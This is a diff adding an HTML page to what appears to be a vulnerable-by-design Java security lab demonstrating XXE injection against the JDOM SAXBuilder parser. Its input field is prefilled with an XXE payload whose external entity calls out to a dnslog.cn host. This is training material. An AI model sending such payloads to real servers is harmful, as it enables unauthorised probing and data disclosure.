@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<div th:replace="~{commons/commons::head}"></div>
+
+<body>
+<div class="layuimini-container">
+    <div class="layuimini-main">
+        <div class="layui-row layui-col-space15">
+            <div class="layui-col-md12">
+                <div class="layui-row layui-col-space10">
+                    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 20px;">
+                        <legend>XXE--SAXBuilder</legend>
+                    </fieldset>
+                    <!--漏洞简介-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>漏洞描述</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <p>XXE (XML External Entity Injection)</p>
+                                <p>SAXBuilder是一个JDOM解析器，能将路径中的XML文件解析为Document对象</p>
+                            </div>
+                        </div>
+                    </div>
+                    <!--漏洞测试-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-hand-o-down icon"></i>漏洞测试</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <form class="layui-form" id="form" th:action="@{/home/xxe/saxbuilder}" method="get">
+                                    <div class="layui-form-item">
+                                        <label class="layui-form-label">content: </label>
+                                        <div class="layui-input-block">
+                                            <input type="text" name="content" id="content" lay-verify="required"
+                                                   lay-reqtext="content不能为空" value="&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;http://0g5zvd.dnslog.cn&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;"
+                                                   autocomplete="off" class="layui-input">
+                                        </div>
+                                    </div>
+                                    <div class="layui-form-item">
+                                        <label class="layui-form-label">实体检测</label>
+                                        <div class="layui-input-block">
+                                            <input type="checkbox" name="entity" id="entity" lay-skin="switch"
+                                                   lay-text="ON|OFF">
+                                        </div>
+                                    </div>
+
+                                    <div class="layui-form-item">
+                                        <div class="layui-input-block">
+                                            <button type="button" id="submit" class="layui-btn" lay-submit=""
+                                                    lay-filter="demo1">立即提交
+                                            </button>
+                                            <button type="reset" class="layui-btn layui-btn-primary">重置</button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                    <!--执行结果-->
+                    <div th:fragment="results" class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>测试结果</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <!--                                <pre th:text="${results}" style="color: red;font-size: 15px;"></pre>-->
+                                <pre id="results" style="color: red;font-size: 15px;"></pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div th:replace="~{commons/commons::script}">
+</div>
+
+<script>
+    $("#submit").click(function () {
+        var content = $("#content").val();
+        if (content.length === 0) {
+            return;
+        }
+        var entity = $("#entity").is(':checked');
+
+        $.ajax({
+            url: "[[@{/home/xxe/saxbuilder?}]]" + $.param({"entity": entity}),
+            type: "POST",
+            contentType: "text/xml",
+            data: content,
+            success: function (result) {
+                $("#results").empty();
+                $("#results").append(he.escape(result));
+            },
+            error: function () {
+                alert("请求发送失败！")
+            },
+        })
+    })
+</script>
+</body>
+</html>
